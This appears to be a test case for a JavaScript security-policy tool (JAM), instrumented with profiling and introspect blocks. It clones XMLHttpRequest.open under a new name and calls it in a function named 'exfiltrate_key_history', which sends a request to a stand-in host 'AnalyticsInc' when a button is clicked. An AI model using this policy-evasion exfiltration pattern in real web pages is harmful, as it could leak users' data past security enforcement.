
JAM.startProfile('load');
function copy(obj$$16) {
  var v10 = typeof obj$$16;
  var v7 = v10 !== "object";
  if (v7) {
    return obj$$16;
  } else {
    var value$$27 = obj$$16.valueOf();
    var v6 = obj$$16 != value$$27;
    if (v6) {
      var v0 = obj$$16.constructor;
      return new v0(value$$27);
    } else {
      var v14 = obj$$16.constructor;
      var v11 = obj$$16 instanceof v14;
      if (v11) {
        var v15 = obj$$16.constructor;
        v11 = v15 !== Object;
      }
      var v5 = v11;
      if (v5) {
        var v12 = obj$$16.constructor;
        var v1 = v12.prototype;
        var c = clone(v1);
        var property;
        for (property in obj$$16) {
          var v3 = obj$$16.hasOwnProperty(property);
          if (v3) {
            introspect(JAM.policy.p1) {
              var v2 = obj$$16[property]
            }
            var v16 = copy(v2);
            c[property] = v16;
          }
        }
      } else {
        c = {};
        for (property in obj$$16) {
          introspect(JAM.policy.p1) {
            var v4 = obj$$16[property]
          }
          var v17 = copy(v4);
          c[property] = v17;
        }
      }
      return c;
    }
  }
  return;
}
function Clone() {
  return;
}
function clone(obj$$17) {
  Clone.prototype = obj$$17;
  return new Clone;
}
function exfiltrate_key_history() {
  xmlhttp = new XMLHttpRequest;
  var v8 = xmlhttp;
  introspect(JAM.policy.p1) {
    var v13 = xmlhttp.open
  }
  var v18 = copy(v13);
  v8.opennew = v18;
  xmlhttp.opennew("GET", "http://AnalyticsInc:8000/submission.html?test=clone5", true);
  xmlhttp.send(null);
  return;
}
var v9 = document.getElementById("test");
v9.onclick = exfiltrate_key_history

JAM.stopProfile('load');
